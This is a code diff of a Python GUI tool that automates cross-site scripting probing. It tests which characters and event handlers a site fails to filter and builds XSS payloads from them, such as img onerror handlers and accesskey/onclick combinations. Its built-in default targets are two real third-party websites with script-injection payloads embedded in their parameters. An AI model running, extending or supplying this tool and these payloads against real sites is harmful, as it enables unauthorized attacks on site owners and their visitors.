@@ -20,9 +20,7 @@ class MyMainWindow(QMainWindow, Ui_MainWindow):
     def __init__(self, parent=None):
         super(MyMainWindow, self).__init__(parent)
         self.setupUi(self)
-        # 执行函数
         # 如果不加 self，tt 只是一个局部变量，当初始化完成，该变量的生命周期就结束了，所以会报 QThread: Destroyed
-        # while thread is still running
         self.myworker = Worker()
         self.startx.clicked.connect(lambda: self.myworker.start())
         # 获取控制台输出
@@ -71,7 +69,7 @@ class Worker(QThread):
         urldata.targeturl = myWin.input_url.text()
         if urldata.targeturl== "":
             print(">>> 未检测到输入，使用内置链接进行测试")
-            urldata.targeturl = "http://www.gzebpubservice.cn/G2/gbp/project/project-trade.do(POST)transactionStage=atestu&projType=atestu&projectName=13800138000&showClassFlag=atestu&publishTime=\"'\"></input><ScrIpt>eval.call`${%27ohsejr(6397)%27}`</ScRIpt>&current=atestu&regionCode=atestu&type=CE&transactionType=atestu="
+            urldata.targeturl = "https://elib.nblib.cn/SSO/PictureCheckCode(POST)width=84&nocache=1563580576513&height=<ScRipt>dsqkhs(6958);</ScRipt>"
         # print("检测目标".rjust(50,">"), "\n", urldata.targeturl)
         # format.breakline()
         begin = PreCheck()
@@ -400,10 +398,11 @@ class CheckStart():
         iiss = 1
         for e1 in urldata.unsensitive['action']:
             for e2 in urldata.unsensitive['onevent']:
-                iiss += 1
-                if iiss<11:
-                    print(">>> "+e2.replace("591", "")+e1)
-                    time.sleep(0.1)
+                if e2 !="AcCESsKeY=591":
+                    iiss += 1
+                    if iiss<11:
+                        print(">>> "+e2.replace("591", "")+e1)
+                        time.sleep(0.1)
 
         if urldata.unsensitive['onevent']:
             urldata.signal['onevent'] = 'yes'
@@ -509,9 +508,27 @@ class CheckStart():
         iiss = 1
         for e1 in urldata.unsensitive['action']:
             for e2 in urldata.unsensitive['onevent']:
-                if iiss < 11 :
-                    payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"nsf="+str591)
-                    iiss += 1
+                if iiss < 11 and e2 !="AcCESsKeY=591":
+                    if e2=="oNcLIck=591" and "AcCESsKeY=591" in urldata.unsensitive['onevent']:
+                        iiss += 1
+                        if "\"591" in urldata.unsensitive['close']:
+                            payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"AcCESsKeY=\"j\""+" "+"nsf="+str591)
+                            break
+                        if "'591" in urldata.unsensitive['close']:
+                            payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"AcCESsKeY='j'"+" "+"nsf="+str591)
+                            break
+                        if "%22591" in urldata.unsensitive['close']:
+                            payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"AcCESsKeY=%22j%22"+" "+"nsf="+str591)
+                            break
+                        if "%27591" in urldata.unsensitive['close']:
+                            payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"AcCESsKeY=%27j%27"+" "+"nsf="+str591)
+                        else:
+                            payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"nsf="+str591)
+
+                    else:
+                        iiss += 1
+                        payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"nsf="+str591)
+
         # print("输出组合测试（不闭合标签）生成 payload:")
         print(">>> 组合测试(不闭合标签)payload:")
         # print("payload.keyword['combination_close_no']:")
@@ -613,7 +630,7 @@ class CheckStart():
 
             str592 = ""
             for e in urldata.unsensitive['close']:
-                if e == "%22591" or e == "%27591" or e == "\"591" or e == "\'591":
+                if e == "%22591" or e == "%27591" or e == "\"591" or e == "\'591" or e=="/591" or e =="%2f591" or e == ">591" or e =="%3e591":
                     str592 += e.replace("591", "")
 
             iiss = 1
@@ -633,7 +650,12 @@ class CheckStart():
                 if re.search(re.escape("img"), e1, re.IGNORECASE):
                     # if "src" in urldata.unsensitive['onevent'] and "onerror" in urldata.unsensitive['onevent']: # 用 in 匹配时注意大小写必须一致，这很烦，所以不用 in，用 re 匹配
                     if re.search(re.escape("src"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE) and re.search(re.escape("onerror"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
-                        payload.keyword['combination_close_yes'].append(str592+"<ImG"+" "+"scr=x"+" "+"OnErrOr="+urldata.unsensitive['action'][0])
+                        # 坑：img 标签中的事件值必须使用单双引号括起来才能生效，例如 onclick="prompt(591)"
+                        if "\"591" in urldata.unsensitive['close']:
+                            payload.keyword['combination_close_yes'].append(str592+"<ImG"+" "+"src=x"+" "+"OnErrOr="+"\""+urldata.unsensitive['action'][0]+"\"")
+                            break
+                        if "\'591" in urldata.unsensitive['close']:
+                            payload.keyword['combination_close_yes'].append(str592+"<ImG"+" "+"src=x"+" "+"OnErrOr="+"\'"+urldata.unsensitive['action'][0]+"\'")
                         # if re.search(re.escape("eval"), "".join(urldata.unsensitive['action']), re.IGNORECASE) :
                         #     payload.keyword['combination_close_yes'].append("<ImG"+" "+"scr=x"+" "+"OnErrOr="+''.join((r'\x%2x'%ord(c)for c in 'alert(591)')))
 
@@ -657,7 +679,7 @@ class CheckStart():
                     if re.search(
                             re.escape(
                                 urllib.parse.unquote(
-                                    urllib.parse.unquote(pd))).replace(" ", "%20").replace("\\\\\\\\","\\\\").replace("\\.*", ".*"),
+                                    urllib.parse.unquote(pd))).replace("\ ", ".*"),
                             PreCheck.get_response(
                                 self,
                                 re.sub(
@@ -686,10 +708,14 @@ class CheckStart():
 
             while urldata.HTTP_METHON == "POST":
                 def post_start(pd):
+                    print(pd)
+                    print("urllib.parse.unquote(pd):"+urllib.parse.unquote(pd))
+                    # print("urllib.parse.unquote(urllib.parse.unquote(pd)))"+urllib.parse.unquote(urllib.parse.unquote(pd)))
+                    print("after re.escape"+re.escape(urllib.parse.unquote(urllib.parse.unquote(pd))))
                     if re.search(
                             re.escape(
                                 urllib.parse.unquote(
-                                    urllib.parse.unquote(pd))).replace(" ", "%20").replace("\\\\\\\\","\\\\").replace("\\.*", ".*"),
+                                    urllib.parse.unquote(pd))).replace("\ ", ".*"),
                             PreCheck.post_response(
                                 self,
                                 re.sub(
@@ -719,78 +745,76 @@ class CheckStart():
 
 
 
-    def check_illusion(self):
-        format.breakline()
-        print("Illusion Testing".center(200))
-        lists.iilusion_replace() #对 payload 进行校验
-        # print(str(mymodule.keyword['illusion']))
-        if not lists.keyword['illusion']:
-            print("No Payload , quit now .".center(170))
-            return
-        while urldata.HTTP_METHON == "GET":
-            def get_start(pd):
-                if re.search(
-                        re.escape(
-                            urllib.parse.unquote(
-                                urllib.parse.unquote(pd))),
-                        PreCheck.get_response(
-                            self,
-                            re.sub(
-                                re.escape("abcdef1234"),
-                                pd,
-                                urldata.get_url),urldata.verbose)):  # 使用 re.escape()
-                    print(pd.center(170))
-                    format.breakline()
-                    urldata.unsensitive['illusion'].append(pd)
-                else:
-                    urldata.sensitive['illusion'].append(pd)
-
-            for i in lists.keyword['illusion']:
-                mythread = threading.Thread(target=get_start(i))
-                mythread.start()
-
-            [print("未过滤：", e.replace("591", ""))
-             for e in urldata.unsensitive['illusion']]
-            [print("过滤：", e.replace("591", ""))
-             for e in urldata.sensitive['illusion']]
-            break
-        while urldata.HTTP_METHON == "POST":
-            # if re.search(re.escape("\"'>"),self.post_response(re.sub(re.escape("abcdef1234"), "\"'>", url_data.post_data))):
-            #     payload.keyword_expand("\"'>")
-            # payload.keyword.sort(key=lambda x:len(x))
-            for i in lists.keyword['illusion']:
-                if re.search(
-                        re.escape(
-                            urllib.parse.unquote(
-                                urllib.parse.unquote(i))),
-                        PreCheck.post_response(
-                            self,
-                            re.sub(
-                                re.escape("abcdef1234"),
-                                i,
-                                urldata.post_data),urldata.verbose)):  # 使用 re.escape()
-                    print(i.center(170))
-                    print(
-                        "注入成功：",
-                        re.sub(
-                            re.escape("abcdef1234"),
-                            i,
-                            urldata.post_data))
-                    format.breakline()
-                    urldata.unsensitive['illusion'].append(i)
-                else:
-                    urldata.sensitive['illusion'].append(i)
-            if urldata.unsensitive['illusion']:
-                [print("未过滤：", e.replace("591", ""))
-                 for e in urldata.unsensitive['illusion']]  # .replace("591","")优化输出
-            else:
-                print("无综合 payload...")
-            # human_read.human_read1(url_data.unsensitive)
-            # [print("过滤：", e.replace("591", "")) for e in url_data.sensitive]
-            break
-
-
-        format.breakline()
+    # def check_illusion(self):
+    #     format.breakline()
+    #     print("Illusion Testing".center(200))
+    #     lists.iilusion_replace() #对 payload 进行校验
+    #     # print(str(mymodule.keyword['illusion']))
+    #     if not lists.keyword['illusion']:
+    #         print("No Payload , quit now .".center(170))
+    #         return
+    #     while urldata.HTTP_METHON == "GET":
+    #         def get_start(pd):
+    #             if re.search(
+    #                     re.escape(
+    #                         urllib.parse.unquote(
+    #                             urllib.parse.unquote(pd))),
+    #                     PreCheck.get_response(
+    #                         self,
+    #                         re.sub(
+    #                             re.escape("abcdef1234"),
+    #                             pd,
+    #                             urldata.get_url),urldata.verbose)):  # 使用 re.escape()
+    #                 print(pd.center(170))
+    #                 format.breakline()
+    #                 urldata.unsensitive['illusion'].append(pd)
+    #             else:
+    #                 urldata.sensitive['illusion'].append(pd)
+    #
+    #         for i in lists.keyword['illusion']:
+    #             mythread = threading.Thread(target=get_start(i))
+    #             mythread.start()
+    #
+    #         [print("未过滤：", e.replace("591", ""))
+    #          for e in urldata.unsensitive['illusion']]
+    #         [print("过滤：", e.replace("591", ""))
+    #          for e in urldata.sensitive['illusion']]
+    #         break
+    #     while urldata.HTTP_METHON == "POST":
+    #         # if re.search(re.escape("\"'>"),self.post_response(re.sub(re.escape("abcdef1234"), "\"'>", url_data.post_data))):
+    #         #     payload.keyword_expand("\"'>")
+    #         # payload.keyword.sort(key=lambda x:len(x))
+    #         for i in lists.keyword['illusion']:
+    #             if re.search(
+    #                     re.escape(
+    #                         urllib.parse.unquote(
+    #                             urllib.parse.unquote(i))),
+    #                     PreCheck.post_response(
+    #                         self,
+    #                         re.sub(
+    #                             re.escape("abcdef1234"),
+    #                             i,
+    #                             urldata.post_data),urldata.verbose)):  # 使用 re.escape()
+    #                 print(i.center(170))
+    #                 print(
+    #                     "注入成功：",
+    #                     re.sub(
+    #                         re.escape("abcdef1234"),
+    #                         i,
+    #                         urldata.post_data))
+    #                 format.breakline()
+    #                 urldata.unsensitive['illusion'].append(i)
+    #             else:
+    #                 urldata.sensitive['illusion'].append(i)
+    #         if urldata.unsensitive['illusion']:
+    #             [print("未过滤：", e.replace("591", ""))
+    #              for e in urldata.unsensitive['illusion']]  # .replace("591","")优化输出
+    #         else:
+    #             print("无综合 payload...")
+    #         break
+    #
+    #
+    #     format.breakline()
 
 if __name__ == "__main__":
     app = QApplication(sys.argv)  # the standard way to init QT
